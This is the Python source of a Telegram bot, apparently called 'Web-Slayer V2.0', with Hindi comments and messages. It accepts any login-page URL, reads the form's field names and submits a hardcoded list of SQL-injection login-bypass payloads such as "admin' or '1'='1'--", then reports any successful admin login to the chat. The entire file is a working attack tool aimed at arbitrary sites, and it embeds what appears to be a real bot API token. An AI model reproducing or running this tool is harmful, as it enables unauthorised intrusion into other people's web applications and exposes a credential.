import telebot
import requests
import time
from bs4 import BeautifulSoup

# आपका टोकन
TOKEN = '8391067758:AAG1DijQMlWl6gSDU7SR_e4pOOnNfSGe3BE'
bot = telebot.TeleBot(TOKEN)

# आपकी पूरी पेलोड लिस्ट
payloads = [
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*", "admin' --", "admin' #", "admin'/*",
    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
    "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#",
    "admin') or '1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*", "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1", "admin\" or 1=1--", "admin\" or 1=1#", "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*", "admin\") or \"1\"=\"1", "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#", "admin\") or \"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
]

def get_form_details(url):
    """वेबसाइट से इनपुट बॉक्स के नाम (username, password) निकालने के लिए"""
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        form = soup.find('form')
        inputs = []
        if form:
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name: inputs.append(name)
        return inputs if len(inputs) >= 2 else ['username', 'password']
    except:
        return ['username', 'password']

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "💀 **Web-Slayer V2.0 Active**\n\nएडमिन लॉगिन पेज का URL भेजें।\nबोट SQL पेलोड्स का उपयोग करके लॉगिन करने की कोशिश करेगा।", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.startswith('http'))
def attack(message):
    target_url = message.text
    chat_id = message.chat.id
    bot.send_message(chat_id, "🔍 फॉर्म डेटा स्कैन कर रहा हूँ...")
    
    keys = get_form_details(target_url)
    user_key = keys[0]
    pass_key = keys[1]
    
    bot.send_message(chat_id, f"🚀 हमला शुरू! \nकुल {len(payloads)*2} टेस्ट।\nKeys: `{user_key}` & `{pass_key}`", parse_mode="Markdown")

    found = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    for p in payloads:
        # दो तरीके से चेकिंग: (p, p) और (admin, p)
        test_cases = [(p, p), ('admin', p)]

        for u, pwd in test_cases:
            try:
                data = {user_key: u, pass_key: pwd}
                response = requests.post(target_url, data=data, headers=headers, timeout=10, allow_redirects=True)
                
                # सफलता के संकेत
                success_indicators = ["dashboard", "admin", "logout", "welcome", "index.php", "profile"]
                if any(ind in response.url.lower() for ind in success_indicators) or \
                   any(ind in response.text.lower() for ind in ["logout", "sign out", "welcome"]):
                    
                    bot.send_message(chat_id, f"✅ **SUCCESS! LOGIN FOUND**\n\n🔗 URL: {target_url}\n👤 Username: `{u}`\n🔑 Password: `{pwd}`", parse_mode="Markdown")
                    found = True
                    break
            except:
                continue
        
        if found: break
        time.sleep(0.3)

    if not found:
        bot.send_message(chat_id, "❌ कोई भी पेलोड काम नहीं आया। साइट पैच हो सकती है।")

bot.polling()
